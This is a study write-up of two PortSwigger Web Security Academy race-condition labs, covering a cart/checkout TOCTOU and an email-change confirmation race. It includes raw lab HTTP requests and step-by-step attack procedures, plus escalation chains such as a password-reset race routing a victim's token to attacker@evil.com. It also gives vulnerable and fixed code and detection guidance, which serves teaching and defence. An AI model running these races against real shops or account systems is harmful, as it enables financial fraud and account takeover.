# 🏁 Day 44 — Race Conditions Part 2 (Multi-endpoint & Single-endpoint)
  
**Platform:** PortSwigger Web Security Academy  
**Category:** Concurrency / Business Logic  
**Labs:** Multi-endpoint Race · Single-endpoint Race

---

## Table of Contents

| # | Section | Focus |
|---|---------|-------|
| §1 | [Foundation](#1-foundation--race-conditions) | Root cause, TOCTOU, concurrency model, race types |
| §2 | [Lab 1 — Multi-endpoint Race](#2-lab-1--multi-endpoint-race-conditions) | Cart/checkout TOCTOU — financial fraud ($1337 jacket for $10) |
| §3 | [Lab 2 — Single-endpoint Race](#3-lab-2--single-endpoint-race-conditions) | Email confirmation mismatch — admin account takeover |
| §4 | [Parameter & Attack Breakdown](#4-parameter--attack-breakdown-tables) | Side-by-side request analysis and lab comparison |
| §5 | [Detection Methodology](#5-detection-methodology) | How to find race conditions in real applications |
| §6 | [Chain Thinking](#6-chain-thinking--attack-paths) | Five escalation paths from race condition to critical impact |
| §7 | [Vulnerable vs Fixed Code](#7-vulnerable-vs-fixed-code) | Line-by-line code analysis with secure alternatives |
| §8 | [Bug Bounty Context](#8-bug-bounty-context) | Severity ratings, payout ranges, and reporting guidance |
| §9 | [Personal Methodology](#9-personal-methodology-notes) | Testing checklists, recognition cues, and code review indicators |
| §10 | [Key Concepts Summary](#10-key-concepts-summary) | Quick-reference table of all concepts covered |
| §11 | [Foundation Checklist](#11-foundation-checklist) | Self-assessment questions for conceptual and practical mastery |

---

## §1 Foundation — Race Conditions

### Root Cause

Race conditions occur when a web application processes concurrent requests that share state, without proper synchronisation. The security assumption that operations happen in a fixed order breaks under concurrency: two threads can read and write the same database row, session variable, or in-memory object at the same time, producing an outcome that no single sequential execution would ever produce.

Web servers run thread pools. Every incoming request gets its own thread. Those threads share resources (the database, session store, application state) with no coordination unless the developer explicitly adds locks or atomic operations.

> [!NOTE]
> **Core Principle:** Race conditions are not an injection class. They exploit the *temporal gap* between when a security condition is evaluated and when it is enforced. The server code may be perfectly correct for sequential execution — it breaks only when two requests overlap in time on shared mutable state.

### TOCTOU — Time of Check to Time of Use

The universal mental model for security-relevant race conditions:

```text
[Check Phase]  Server reads state → "Does the user have enough credit?"  → YES ✓
                              ↕
                     ⚡ RACE WINDOW ⚡
                     Another thread modifies the same state
                              ↕
[Use Phase]    Server acts on the check result (which is now stale)
                     → Processes order using old validated total

RESULT: Action executes against state that no longer matches the check — security bypass
```

### Concurrency Model (Web Server Thread Pool)

```text
HTTP Request A → Thread 1 → read shared state ────────────────────────── act (stale read!)
                                      ↑                                        ↑
                                      |          ⚡ NO LOCK ⚡                 |
                                      |                                        |
HTTP Request B → Thread 2 ─────────────────────── write shared state ─────────┘
                                      Thread 1's read above is now invalid
```

### Race Condition Types in Web Applications

| Type | Mechanism | Classic Example |
|------|-----------|----------------|
| **Limit Overrun** | Race the same endpoint N times; bypass a single-use check before the "used" flag is written | Apply discount code twice simultaneously |
| **Multi-endpoint** | Race two different endpoints whose shared state has a TOCTOU dependency | Add expensive item + checkout at the same time |
| **Single-endpoint** | Race the same endpoint with different parameters; shared field overwritten mid-execution | Two email-change requests cause confirmation mismatch |
| **Partial Construction** | Read an object that is being written — catches it in a partially-initialised state | Read a token before all its fields are committed to DB |

---

## §2 Lab 1 — Multi-endpoint Race Conditions

> 🔗 https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint

**Goal:** Purchase a $1337 jacket using store credit that shouldn't cover it · ✅ Solved in 2–3 attempts

### Scenario

The shop lets users accumulate store credit via gift card redemption. The checkout endpoint reads the current cart, validates that available credit covers the total, then processes the order. The race window exists between the **credit-validation step** and the **order-processing step** — the cart is shared state and can be modified by a concurrent request during that gap.

### Vulnerable Purchase Flow — Race Mechanism

```text
Normal Sequential Flow:
  [1] Cart state: { gift_card ($10) }
  [2] POST /cart/checkout → reads cart → total = $10
  [3] CHECK: credit ($10) ≥ total ($10) ✓
  [4] Process order → purchases { gift_card }
  [5] Deduct $10 credit

⚡ Exploited Concurrent Flow:

  [1] Cart state: { gift_card ($10) }  ← low-value item only

  [2] Thread 1: POST /cart/checkout
        → reads cart → total = $10 (gift card only)
        → CHECK: credit ($10) ≥ $10 ✓  ← validation passes on gift card amount
                    ↕
            ⚡ RACE WINDOW OPEN ⚡
                    ↕
  [3] Thread 2: POST /cart
        → adds jacket (productId=1, $1337) to cart in DB
        → Cart now: { gift_card, jacket }
                    ↕
            ⚡ RACE WINDOW CLOSES ⚡
                    ↕
  [4] Thread 1 continues → process_order() re-reads cart → gets { gift_card, jacket }!
  [5] Deducts only $10 (the stale validated total, not $1347)

RESULT: $1337 jacket acquired. Only $10 deducted. Financial fraud.
```

### Timing Strategy — The 687ms Anchor

Burp's "Send group in parallel" synchronises TCP connection establishment, but server-side application processing still has variance. The homepage `GET /` takes ~687ms. Sending it first creates a controlled timing window:

1. Send `GET /` alone (slow, ~687ms) — this fires before the race group
2. Immediately after, fire the race group (`POST /cart` + `POST /cart/checkout`) in parallel
3. The slow homepage response keeps the server busy, helping the race group arrive mid-checkout-processing rather than before or after it

> [!WARNING]
> **Timing Sensitivity:** Too early → checkout fires before jacket is in cart (full price charged). Too late → checkout has already finished, sees only gift card. The window is narrow; 2–3 retries were needed.

### Raw HTTP Requests

#### Timing Anchor — GET / (sent first, independently)

```http
GET / HTTP/2
Host: 0a21004903c0eff08137521b0011005b.web-security-academy.net
Cookie: session=D4LlKgqOpXVHS0GL9Uc41sps4VpxOEO2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a21004903c0eff08137521b0011005b.web-security-academy.net/cart/checkout
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

# Role: timing anchor. Response ~687ms. Sent ALONE before the race group fires.
# Not part of the race — its slowness creates the window we need.
```

#### Race Request 1 — POST /cart (Add Jacket)

```http
POST /cart HTTP/2
Host: 0a21004903c0eff08137521b0011005b.web-security-academy.net
Cookie: session=D4LlKgqOpXVHS0GL9Uc41sps4VpxOEO2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a21004903c0eff08137521b0011005b.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0a21004903c0eff08137521b0011005b.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=1&redir=PRODUCT&quantity=1
# productId=1 → Lightweight L33t Leather Jacket ($1337)
# Sent in parallel with POST /cart/checkout via Burp "Send group in parallel"
```

#### Race Request 2 — POST /cart/checkout

```http
POST /cart/checkout HTTP/2
Host: 0a21004903c0eff08137521b0011005b.web-security-academy.net
Cookie: session=D4LlKgqOpXVHS0GL9Uc41sps4VpxOEO2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0a21004903c0eff08137521b0011005b.web-security-academy.net
Referer: https://0a21004903c0eff08137521b0011005b.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

# Body: CSRF token field (Content-Length: 37; body not captured in lab output)
# Sent in parallel with POST /cart via Burp "Send group in parallel"
```

### Step-by-Step Attack

1. Log in as `wiener:peter`
2. Find a low-value gift card in the shop → add to cart → purchase it to gain store credit
3. In Burp Repeater, open three tabs: `GET /`, `POST /cart` (jacket), `POST /cart/checkout`
4. Send `GET /` independently (timing anchor, ~687ms)
5. Immediately after: select the race tabs → **"Send group in parallel"**
6. Inspect the checkout response — if jacket appears in the order, lab solved
7. If not, retry (2–3 attempts sufficient)

---

## §3 Lab 2 — Single-endpoint Race Conditions

> 🔗 https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint

**Goal:** Claim admin email via confirmation mismatch → delete carlos · 🔑 **Impact:** Full Account Takeover

### Scenario

The email-change flow generates a confirmation token and sends it to the newly requested address. The vulnerability: `pending_email` is stored in a shared field on the user record. If a second concurrent request overwrites that field before the first request reads it to send the confirmation email, the token for one address gets delivered to a completely different inbox — one the attacker controls.

### Vulnerable Email Change Flow — Race Mechanism

```text
Normal Sequential Flow:
  Request → write pending_email = "new@example.com"
           → token = generate_token()
           → read pending_email → "new@example.com"
           → send confirmation link to "new@example.com"
  User clicks → email confirmed ✓

⚡ Single-endpoint Race (2 simultaneous requests, same endpoint, different email params):

Thread 1:  write pending_email = "carlos@ginandjuice.shop"    ← target admin email
           token_A = generate_token()
           store_record(token_A, user_id, "carlos@ginandjuice.shop")
                         ↕
                ⚡ RACE WINDOW ⚡
                         ↕
Thread 2:  write pending_email = "attacker@exploit-server.net"  ← attacker's email
           token_B = generate_token()
           store_record(token_B, user_id, "attacker@exploit-server.net")
           ↑↑↑ Thread 2 OVERWRITES pending_email before Thread 1 reads it ↑↑↑
                         ↕
Thread 1 continues:
  read pending_email → gets "attacker@exploit-server.net"  ← overwritten by Thread 2!
  send_email(to="attacker@exploit-server.net", link_with_token=token_A)
  # token_A when clicked confirms "carlos@ginandjuice.shop" for wiener's account

RESULT: Attacker receives email containing token_A confirmation link
        Attacker clicks link → wiener's email = "carlos@ginandjuice.shop"
        carlos@ginandjuice.shop = admin email → admin panel visible
        Delete carlos → lab solved
```

### Raw HTTP Requests

#### Race Request 1 — Target Admin Email (Thread 1)

```http
POST /my-account/change-email HTTP/2
Host: 0a6300b703bcb00282dff64f00de00ec.web-security-academy.net
Cookie: session=231gSjNN4eOGIowRrCCEa3ITI4zdMqpO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: https://0a6300b703bcb00282dff64f00de00ec.web-security-academy.net
Referer: https://0a6300b703bcb00282dff64f00de00ec.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=carlos%40ginandjuice.shop&csrf=qXFbuabGRf69sDozvycj2CfqFm5udSto
# Decoded: carlos@ginandjuice.shop — the privileged admin email we want to claim
# Goal: server generates token for THIS address, but sends it to Thread 2's email
```

#### Race Request 2 — Attacker-Controlled Email (Thread 2)

```http
POST /my-account/change-email HTTP/2
Host: 0a6300b703bcb00282dff64f00de00ec.web-security-academy.net
Cookie: session=231gSjNN4eOGIowRrCCEa3ITI4zdMqpO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: https://0a6300b703bcb00282dff64f00de00ec.web-security-academy.net
Referer: https://0a6300b703bcb00282dff64f00de00ec.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=test4%40exploit-0a39004f03c9b0228200f55601ba00b1.exploit-server.net&csrf=qXFbuabGRf69sDozvycj2CfqFm5udSto
# Decoded: test4@exploit-....exploit-server.net — attacker-controlled inbox
# Goal: overwrites pending_email so Thread 1's confirmation email lands here
```

> [!NOTE]
> **Why the same CSRF token for both requests?** CSRF tokens in this lab are session-scoped, not request-scoped. The token `qXFbuabGRf69sDozvycj2CfqFm5udSto` is valid for any POST within session `231gSjNN4eOGIowRrCCEa3ITI4zdMqpO`. Both requests use the same session cookie — both pass CSRF validation. This is correct CSRF behaviour, not an additional vulnerability. The entire attack lives in the email confirmation logic.

### Step-by-Step Attack

1. Log in as `wiener:peter` → navigate to account settings
2. Intercept a `POST /my-account/change-email` in Burp → send to Repeater
3. Duplicate the tab — create two tabs in the same Repeater group
4. Tab 1 body: `email=carlos%40ginandjuice.shop&csrf=<token>`
5. Tab 2 body: `email=<your-exploit-server-address>&csrf=<token>`
6. Select both tabs → **"Send group in parallel"**
7. Open exploit-server email client — wait for a confirmation link to arrive
8. If a link arrives: click it → wiener's email becomes `carlos@ginandjuice.shop`
9. If no email: retry (race is timing-dependent — repeat until confirmation arrives)
10. Navigate to admin panel → delete `carlos` user → lab solved

---

## §4 Parameter & Attack Breakdown Tables

### Lab 1 — Request Parameters

| Parameter | Value | Purpose | Race Role |
|-----------|-------|---------|-----------|
| `productId` | `1` | Identifies the jacket | The high-value item slipped into cart during the race window |
| `redir` | `PRODUCT` | Redirect after cart add | Irrelevant to race |
| `quantity` | `1` | Number of items | Irrelevant to race |
| Session Cookie | `D4LlKg...OEO2` | Identifies user and their cart | **Critical:** Both race requests use the same session → same cart state → race is possible |
| GET / (timing anchor) | ~687ms response | Creates timing window | Sent first alone; its slowness aligns the race group with the checkout validation step |

### Lab 2 — Request Parameters

| Parameter | Request 1 (Thread 1) | Request 2 (Thread 2) | Race Role |
|-----------|---------------------|---------------------|-----------|
| `email` | `carlos@ginandjuice.shop` | `test4@exploit-server.net` | Thread 2 overwrites `pending_email` before Thread 1 reads it → token for admin email delivered to attacker inbox |
| `csrf` | `qXFbuabGR...Sto` | `qXFbuabGR...Sto` | Session-scoped token — valid for both requests. Not itself a vulnerability. |
| Session Cookie | `231gSjNN...qpO` | `231gSjNN...qpO` | **Critical:** Same session → same `pending_email` field → both threads can race-overwrite it |

### Lab Comparison

| Dimension | Lab 1 — Multi-endpoint | Lab 2 — Single-endpoint |
|-----------|----------------------|------------------------|
| Endpoints raced | `POST /cart` + `POST /cart/checkout` | `POST /my-account/change-email` × 2 |
| Race type | TOCTOU (validate → stale re-read → process) | Write-write race (shared field overwrite before read) |
| Shared state exploited | Cart contents in DB/session | `pending_email` field in user record |
| Impact | Financial fraud ($1337 jacket for $10) | Account Takeover via admin email claim |
| Timing difficulty | High — needed 687ms anchor | Medium — parallel send alone sufficient |
| Success indicator | Checkout response contains jacket | Confirmation email arrives at exploit-server inbox |
| Attempts needed | 2–3 | Variable; repeat until confirmation email arrives |

---

## §5 Detection Methodology

### Step 1 — Identify Candidates

Target endpoints that exhibit any of these patterns:

- **Read → Validate → Act:** Any flow where the result of a security check is used later in the same request (TOCTOU)
- **One-use enforcement:** Discount codes, vouchers, rate limits, tokens marked "used" after consumption
- **Shared mutable state:** Cart, credit balance, `pending_*` fields, counters in session
- **Multi-step confirmation flows:** Email/phone/2FA change, password reset, invite redemption
- **Cross-endpoint state dependency:** Endpoint A writes what Endpoint B reads to make a security decision

### Step 2 — Map State Dependencies

Ask: *"If Endpoint A writes to shared state X, and Endpoint B reads X to make a security decision — can they overlap?"* If yes → multi-endpoint race candidate. Also ask: *"Does this endpoint read a shared field to decide where to send something or whom to credit?"* If yes → single-endpoint race candidate.

### Step 3 — Test in Burp Suite

| Technique | How | Best For |
|-----------|-----|---------|
| **Repeater Group — Parallel** | Add tabs to a group → right-click → "Send group in parallel" | Multi-endpoint and single-endpoint races |
| **Timing Anchor** | Send a slow request first; immediately fire the race group | Aligning race requests in multi-endpoint scenarios (Lab 1) |
| **Turbo Intruder (race.py)** | Script concurrent requests with precise timing control | Limit overrun races needing 10–20 simultaneous requests |
| **Last-byte Sync** | Send all but the last byte of each request, then flush simultaneously | Tightest possible race window; bypasses connection-level jitter |

### Step 4 — Success Signals

- Price anomaly in order response (paid less than item costs)
- Confirmation email delivered to unexpected address
- Duplicate order, credit, or resource created
- Response reflects state that should be impossible (item in order that wasn't paid for)
- Rate limit or "already used" error appears inconsistently across repeated attempts

> [!WARNING]
> **Scanner Gap:** Automated scanners (Burp Active Scan, OWASP ZAP) almost never detect race conditions. They require deliberate manual identification of concurrent state-mutating flows. This is why race conditions consistently rank as high-value manual findings in bug bounty — low competition, high reward.

---

## §6 Chain Thinking — Attack Paths

### Path 1: Email Change Race → Admin ATO (Lab 2 Chain)

```text
Race POST /change-email (admin_email + attacker_email simultaneously)
  → write-write race: confirmation token for admin_email sent to attacker inbox
    → attacker clicks link → account email = admin_email
      → admin panel access
        → read/delete/modify all user accounts
          → FULL ADMINISTRATIVE CONTROL + data exfiltration
```

### Path 2: Cart Race → Financial Fraud + PII (Lab 1 Chain)

```text
Race POST /cart (high-value item) + POST /cart/checkout
  → TOCTOU: checkout validates cheap item price but processes full cart
    → acquire premium item below cost (or free)
      → chain with IDOR on GET /orders?id=N
        → access other users' order history
          → billing addresses, card last-4, purchase patterns (PII)
            → financial fraud + privacy violation report
```

### Path 3: Password Reset Race → Account Takeover

```text
POST /forgot-password   email=victim@target.com     ← initiate reset
POST /forgot-password   email=attacker@evil.com      ← simultaneous
  → pending_email overwrite: reset token for victim sent to attacker
    → attacker clicks link → sets victim's new password
      → full ATO (zero victim interaction required)
```

### Path 4: File Upload Race → Malicious File Processing

```text
Upload legit.jpg → server begins AV scan / MIME validation
  → race: upload evil.php before validation completes
    → evil.php inherits "passed" validation state
      → processed as trusted file
        → stored XSS (SVG) / SSRF (XML) / RCE (executable)
```

### Path 5: Coupon Overrun → Unlimited Discount

```text
Send 10x POST /apply-coupon simultaneously with same code
  → each thread reads: "is code used?" → NO (flag not yet set)
    → all 10 threads apply the discount
      → 10× discount stacked on single order
        → large purchase at near-zero cost
```

---

## §7 Vulnerable vs Fixed Code

### 7.1 Multi-endpoint Race — Checkout TOCTOU

#### ❌ Vulnerable — Re-reads Cart After Validation

```python
# Python pseudocode
def checkout(session_id, user_id):
    cart  = db.get_cart(session_id)              # [1] Read cart snapshot → {gift_card}
    total = calculate_total(cart)                # [2] total = $10
    credit = db.get_credit(user_id)

    if credit >= total:                           # [3] CHECK → $10 ≥ $10 ✓ (stale!)
        ## ⚠️ RACE WINDOW: concurrent POST /cart adds jacket to DB cart here
        fresh = db.get_cart(session_id)          # [4] RE-READ → now {gift_card, jacket}!
        process_order(fresh)                     # [5] processes jacket despite $10 validation
        db.deduct_credit(user_id, total)         # [6] deducts stale $10, not $1347
```

#### ✅ Fixed — Atomic Transaction + Row Lock

```python
# Fix 1: explicit row-level lock on the cart
def checkout(session_id, user_id):
    with db.transaction() as tx:
        with tx.row_lock(f"cart:{session_id}"):   # lock → no concurrent cart writes possible
            cart  = tx.get_cart(session_id)       # single read under lock
            total = calculate_total(cart)
            credit = tx.get_credit(user_id)
            if credit >= total:
                process_order(cart)               # same locked snapshot — never re-reads
                tx.deduct_credit(user_id, total)
        # lock released at end of transaction

# Fix 2: optimistic locking — detect if cart was modified between read and use
def checkout(session_id, user_id):
    cart, version = db.get_cart_with_version(session_id)
    total = calculate_total(cart)
    credit = db.get_credit(user_id)
    if credit >= total:
        ok = db.process_if_version_matches(cart, version)  # atomic CAS
        if not ok:
            raise CartModifiedError("Cart changed during checkout — retry")
```

### 7.2 Single-endpoint Race — Email Confirmation Mismatch

#### ❌ Vulnerable — Stores Then Re-reads `pending_email`

```python
# Python pseudocode
def change_email(user_id, new_email, csrf):
    validate_csrf(csrf)

    # Write new_email to a shared field in the users table
    db.execute("UPDATE users SET pending_email = ? WHERE id = ?",
               new_email, user_id)

    token = generate_token()
    db.execute("INSERT INTO tokens VALUES (?,?,?)", token, user_id, new_email)

    ## ⚠️ RACE WINDOW: concurrent request overwrites pending_email right here

    # Re-reads from shared field — might get a different email now!
    pending = db.execute(
        "SELECT pending_email FROM users WHERE id = ?", user_id
    )[0]
    send_confirmation_email(pending, token)  # sends token to WRONG inbox
```

#### ✅ Fixed — No Shared Intermediate State; Use Request-local Variable

```python
# Fix: eliminate pending_email from the users row entirely.
# Store confirmation records in a separate table tied to the token.
def change_email(user_id, new_email, csrf):
    validate_csrf(csrf)
    token = generate_token()

    # Token record carries the exact email it was issued for — immutable after insert
    db.execute(
        "INSERT INTO email_confirmations (token, user_id, email, expires_at) "
        "VALUES (?, ?, ?, ?)",
        token, user_id, new_email, now() + timedelta(hours=24)
    )

    # Use the LOCAL variable — no DB re-read, no shared field to race
    send_confirmation_email(new_email, token)  # ✓ passes new_email directly

# On confirmation click:
def confirm_email(token):
    row = db.execute(
        "SELECT user_id, email FROM email_confirmations "
        "WHERE token = ? AND expires_at > NOW()", token
    )
    if not row:
        raise InvalidToken()
    db.execute("UPDATE users SET email = ? WHERE id = ?", row.email, row.user_id)
    db.execute("DELETE FROM email_confirmations WHERE token = ?", token)
    # Token is tied to the exact email at creation time.
    # No shared pending_email field exists to race-overwrite.
```

---

## §8 Bug Bounty Context

| Race Type | Impact | CVSS ~ | Typical Payout | Severity |
|-----------|--------|--------|---------------|----------|
| Email/phone change race → ATO | Full account takeover, zero victim interaction | 8.1–9.0 | $2,000–$15,000 | 🔴 Critical |
| Password reset race → ATO | Account takeover | 7.5–9.0 | $2,000–$12,000 | 🔴 Critical |
| Checkout / cart race | Financial fraud, free premium goods | 6.0–8.0 | $500–$5,000 | 🟠 High |
| Coupon / voucher overrun | Unlimited discount, direct financial loss | 5.0–7.0 | $200–$2,000 | 🟡 Medium |
| Rate-limit bypass race | Enables brute force, enumeration | 5.0–7.5 | $200–$3,000 | 🟡 Medium |
| Duplicate resource creation | Double-mint tokens, extra credits | 4.0–6.0 | $100–$1,000 | 🟡 Medium |

### Where to Hunt in Real Applications

- **E-commerce:** Checkout, cart add/remove, gift card redemption, coupon application, refunds
- **Account management:** Email change, phone change, password reset, 2FA setup/removal, username change
- **Financial apps:** Transfer initiation, withdrawal limit enforcement, wallet top-up, crypto swaps
- **Subscription / SaaS:** Plan upgrade, trial activation, feature flag toggle, seat allocation
- **APIs:** Any state-mutating POST/PUT that reads → validates → writes on shared state

### Reporting Race Conditions

1. **PoC clarity:** Burp Repeater group export or a `curl` one-liner showing parallel execution
2. **Timing note:** State explicitly that the race is timing-sensitive and may need 2–5 attempts
3. **State proof:** Before/after screenshots showing the anomalous state (email changed, balance wrong)
4. **Impact statement:** Quantify — "attacker can acquire any product for free" or "take over any account without the victim's password"
5. **Fix suggestion:** DB-level locking, atomic CAS operations, or eliminating intermediate shared state re-reads

---

## §9 Personal Methodology Notes

### Race Condition Testing Checklist

- [ ] Map all state-mutating endpoints (POST/PUT/PATCH/DELETE)
- [ ] Identify TOCTOU patterns: any handler that reads shared state, validates, then acts
- [ ] Identify write-write patterns: same shared field writable by concurrent requests
- [ ] Map cross-endpoint state dependencies (what does Endpoint B read that Endpoint A writes?)
- [ ] Measure endpoint response times — slow = wider race window = easier to exploit
- [ ] Set up Burp Repeater group with candidate requests
- [ ] Send group in parallel — minimum 5–10 attempts
- [ ] Check all side effects: emails, balance, DB flags, log entries
- [ ] If multi-endpoint: try timing anchor strategy (fire slow request first)
- [ ] If single-endpoint: vary parameter values across race requests, watch external channels

### Quick Recognition Cues

- `pending_email`, `pending_phone`, `pending_change` in response or traffic → single-endpoint race candidate
- Checkout that reads cart again after validating credit → multi-endpoint TOCTOU candidate
- "This code has already been used" appearing sometimes but not always → limit overrun race
- Endpoint response time > 500ms on a state-mutating route → wide window, easier to hit
- Same session cookie across both race requests → shared state confirmed, race is possible

### View-Source / Code Review Indicators

- Multiple `SELECT` calls on the same field within one request handler (read → something → read again)
- Absence of `SELECT FOR UPDATE` or `LOCK IN SHARE MODE` in transaction blocks
- Global or class-level variables written by multiple request handlers without synchronisation primitives
- Email/notification flows that write a destination to the DB, then read it back to send
- `TODO: add locking` or `TODO: handle concurrent requests` in source comments

### API Security Note

Race conditions are especially dangerous in REST and GraphQL APIs because clients often fire multiple concurrent calls by design — pagination, batched mutations, parallel data fetches. API gateway rate limiting almost never protects against within-session racing. Always test state-mutating API endpoints for concurrent execution when assessing any API surface.

---

## §10 Key Concepts Summary

| Concept | Description | Why It Matters |
|---------|-------------|----------------|
| **TOCTOU** | Time Of Check To Time Of Use — the gap between reading state and acting on it | Core flaw behind multi-endpoint races (Lab 1) |
| **Write-write race** | Two concurrent writes to the same shared field; the second overwrites the first before it is read | Core flaw behind single-endpoint races (Lab 2) |
| **Shared mutable state** | Any data (DB row, session field, in-memory object) that multiple threads can read and modify | The prerequisite for any race condition — no shared state = no race |
| **Race window** | The brief time gap (often 1–5ms) where shared state is inconsistent | The window the attacker must hit with concurrent requests |
| **Timing anchor** | A slow request (e.g., `GET /` at ~687ms) sent before the race group to align arrival timing | Technique for multi-endpoint races where precise alignment is needed |
| **Send group in parallel** | Burp Repeater feature that fires grouped requests simultaneously | Primary tool for race condition testing |
| **Atomic transaction** | An operation that completes fully or not at all, with no visible intermediate state | The defense concept — making check+act into a single indivisible operation |
| **`SELECT ... FOR UPDATE`** | SQL clause that acquires a row-level lock, blocking concurrent access | Primary database-level defense against race conditions |
| **Optimistic locking** | Version-check before commit — detects if state changed since read | Alternative defense that avoids explicit locks |
| **Request-local variables** | Using the variable from the current request instead of re-reading from DB | Eliminates single-endpoint races by removing shared intermediate state |

---

## §11 Foundation Checklist

### Conceptual Understanding
- [ ] What is the difference between a multi-endpoint race and a single-endpoint race? Give an example of each.
- [ ] Explain TOCTOU in the context of the checkout flow (Lab 1). Where exactly is the check, and where is the use?
- [ ] In Lab 2, why does the server send the confirmation email to the wrong address? Trace the exact sequence of DB reads and writes.
- [ ] Why can't automated scanners (Burp Active Scan, ZAP) reliably detect race conditions?
- [ ] What are the three conditions required for a race condition to be exploitable?

### Technical Understanding
- [ ] Why does the timing anchor (`GET /` at ~687ms) improve success rates in Lab 1?
- [ ] What is the difference between pessimistic locking (`SELECT ... FOR UPDATE`) and optimistic locking (version check)?
- [ ] In the vulnerable checkout code, why does the `re-read` of the cart after validation create the vulnerability?
- [ ] Why is using a request-local variable instead of a DB re-read sufficient to fix the email confirmation race?
- [ ] How does HTTP/2 multiplexing make race condition attacks more reliable than HTTP/1.1?

### Practical Understanding
- [ ] You find an endpoint with a 600ms response time that writes to a shared DB field. Is this a good race candidate? Why?
- [ ] A developer says "we added a CSRF token so race conditions can't happen." Why is this incorrect?
- [ ] How would you report a race condition to a bug bounty program? What evidence would you include?
- [ ] Name three features in a typical e-commerce application where race conditions commonly hide.
- [ ] If you see `pending_email` in API responses, what type of race condition should you test for?

---
